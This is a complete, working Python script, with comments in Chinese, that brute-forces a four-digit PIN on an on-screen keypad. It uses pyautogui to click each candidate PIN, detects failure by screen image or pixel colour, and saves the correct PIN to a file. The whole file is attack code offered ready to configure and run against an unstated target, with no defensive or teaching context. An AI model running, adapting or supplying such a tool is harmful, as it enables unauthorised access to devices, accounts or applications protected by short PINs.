#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pyautogui
import time
import logging
from datetime import datetime
import sys

# ==================== 用户配置区域（请按实际修改） ====================

# 1. 密码尝试范围（包含两端）
START_PIN = 1251          # 起始密码，例如从 123 开始设为 123
END_PIN = 1401         # 结束密码，例如到 4567 则设为 4567

# 2. 数字键盘坐标推算（基于“1”键的中心坐标和间距）
FIRST_KEY_COORD = (988, 623)   # 数字“1”按钮的中心点 (x, y)
H_SPACING = 65                # 水平方向相邻按钮的像素间距
V_SPACING = 50                 # 垂直方向相邻按钮的像素间距

# 3. 清除按钮坐标（独立配置）
CLEAR_COORD = (993, 843)       # “清除”按钮的中心点

# 4. 错误检测方式（二选一）
USE_IMAGE_DETECTION = True     # True=图像匹配，False=像素颜色检测
ERROR_TEMPLATE = "./templates/error_msg.png"   # 若使用图像匹配，需准备模板图片
ERROR_REGION = (400, 200, 200, 50)             # 若使用像素检测，错误文字出现区域
ERROR_RGB_THRESHOLD = (200, 50, 50)            # 像素检测的RGB阈值（红底色示例）

# 5. 时间参数（可根据网络/系统响应速度微调）
WAIT_AFTER_SUBMIT = 0.9        # 输入完四位后等待校验的秒数
CLICK_INTERVAL = 0.1           # 每次点击后的短暂停顿

# ==================== 配置结束，以下无需改动 ====================

# 设置PyAutoGUI全局暂停
pyautogui.PAUSE = 0.05

# 适配屏幕缩放（Windows）
try:
    import ctypes
    ctypes.windll.user32.SetProcessDPIAware()
except:
    pass

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bruteforce_log.txt", encoding='utf-8'),
        logging.StreamHandler()
    ]
)

# ---------- 自动生成数字坐标 ----------
# 布局：3列4行（0在最后一行中间）
NUM_COORDS = {}
num_layout = [
    ['1','2','3'],
    ['4','5','6'],
    ['7','8','9'],
    ['','0','']   # 0在中间列
]

for row_idx, row in enumerate(num_layout):
    for col_idx, digit in enumerate(row):
        if digit:
            x = FIRST_KEY_COORD[0] + col_idx * H_SPACING
            y = FIRST_KEY_COORD[1] + row_idx * V_SPACING
            NUM_COORDS[digit] = (x, y)

# 可选：打印生成的坐标供核对
logging.debug("生成的数字坐标:")
for d, coord in NUM_COORDS.items():
    logging.debug(f"  {d}: {coord}")

# ---------- 核心函数 ----------

def click_at(coord, wait=CLICK_INTERVAL):
    """点击指定坐标"""
    pyautogui.click(coord[0], coord[1])
    time.sleep(wait)

def clear_input():
    """点击清除按钮"""
    click_at(CLEAR_COORD)
    logging.debug("已清除")

def input_password(password):
    """依次点击密码的每一位"""
    for digit in password:
        coord = NUM_COORDS.get(digit)
        if coord is None:
            logging.error(f"未知数字: {digit}")
            return False
        click_at(coord)
    return True

def is_error_detected():
    """检测错误提示是否出现"""
    if USE_IMAGE_DETECTION:
        try:
            pos = pyautogui.locateOnScreen(ERROR_TEMPLATE, confidence=0.85)
            return pos is not None
        except Exception as e:
            logging.error(f"图像检测出错: {e}")
            return True
    else:
        try:
            screenshot = pyautogui.screenshot(region=ERROR_REGION)
            avg_color = screenshot.resize((1, 1)).getpixel((0, 0))
            r, g, b = avg_color
            # 判断是否接近预设错误颜色
            if r > ERROR_RGB_THRESHOLD[0] and g < ERROR_RGB_THRESHOLD[1] and b < ERROR_RGB_THRESHOLD[2]:
                return True
            else:
                return False
        except Exception as e:
            logging.error(f"像素检测出错: {e}")
            return True

def record_correct_password(password):
    with open("correct_password.txt", "w") as f:
        f.write(f"正确密码: {password}\n发现时间: {datetime.now()}\n")
    logging.info(f"🎉 成功找到正确密码: {password}")

# ---------- 主程序 ----------

def main():
    total = END_PIN - START_PIN + 1
    logging.info(f"开始尝试，范围: {START_PIN:04d} ~ {END_PIN:04d}，共 {total} 个密码")
    logging.info("按下 Ctrl+C 可随时安全终止程序")

    start_time = time.time()
    last_tried = None

    try:
        for pin in range(START_PIN, END_PIN + 1):
            password = f"{pin:04d}"
            last_tried = password
            logging.info(f"尝试: {password} ({pin-START_PIN+1}/{total})")

            # 1. 清除
            clear_input()

            # 2. 输入密码
            if not input_password(password):
                logging.error("输入失败，跳过")
                continue

            # 3. 等待校验
            time.sleep(WAIT_AFTER_SUBMIT)

            # 4. 检测错误
            if not is_error_detected():
                # 未检测到错误，再确认一次
                time.sleep(0.5)
                if not is_error_detected():
                    record_correct_password(password)
                    logging.info("🎉 任务完成！")
                    return

            # 每100次记录进度
            if (pin - START_PIN + 1) % 100 == 0:
                elapsed = time.time() - start_time
                avg = elapsed / (pin - START_PIN + 1)
                remaining = (END_PIN - pin) * avg
                logging.info(f"进度: {pin-START_PIN+1}/{total}, 耗时 {elapsed//60:.0f}分 {elapsed%60:.0f}秒, 预计剩余 {remaining//60:.0f}分")

    except KeyboardInterrupt:
        logging.warning(f"\n用户中断！当前尝试到密码: {last_tried}")
        logging.warning(f"如需继续，请将 START_PIN 改为 {int(last_tried)+1:04d} 后重新运行")
        sys.exit(0)

    logging.warning("遍历完毕，未找到正确密码。")

if __name__ == "__main__":
    print("=" * 50)
    print("请确认：")
    print("1. 目标窗口已打开并置于最前")
    print("2. 坐标配置已正确测量")
    print("3. 按 Ctrl+C 可随时终止")
    print("=" * 50)
    print("5秒后开始...")
    time.sleep(5)
    main()